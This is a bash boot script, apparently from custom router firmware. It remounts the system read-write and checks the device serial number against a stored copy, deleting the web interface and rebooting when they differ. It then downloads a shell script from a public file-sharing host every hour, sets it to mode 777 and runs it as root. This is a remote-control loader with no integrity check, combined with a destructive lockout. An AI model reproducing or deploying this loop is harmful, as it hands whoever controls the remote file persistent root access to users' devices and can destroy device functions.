#!/bin/bash

# 挂载文件系统为可读写状态
mount -o remount,rw /
mount -o remount,rw /m_data
mount -o remount,rw /m_webui

cd /etc/
sn=$(sed -n 's/^device_sn=\(.*\)/\1/p' /tmp/m_tmp/db/ram.txt)
echo $sn > /tmp/sn.txt
if [ -f sn2.txt ]; then
   echo "存在文件，比较sn.txt和sn2.txt"
   # 读取内容
     sn_content=$(cat /tmp/sn.txt)
   # 比较内容
     if grep -q "$sn_content" sn2.txt; then
           echo "包含内容,验证通过，不执行任何操作"
         else
           echo "不包含内容,验证不通过，行任重启"
           rm /m_webui/webui
           reboot
     fi
  else
    echo "不存在，首次开机生成sn2.txt"
    cp /tmp/sn.txt /etc/sn2.txt
fi

while true; do
cd /tmp/
rm /tmp/R106_0.sh
wget -O R106_0.sh "https://vip.123pan.cn/1725810/%E5%88%B7%E6%9C%BA%E5%8C%85%E5%9C%A8%E7%BA%BF%E6%96%87%E4%BB%B6/r106/file/R106_0.sh"

          if [ -f R106_0.sh ]; then
            echo "下载完成，执行文件"
            chmod 777 R106_0.sh
            /tmp/R106_0.sh start
          else
            echo "下载失败,服务器未打开"
          fi

sleep 3600
done
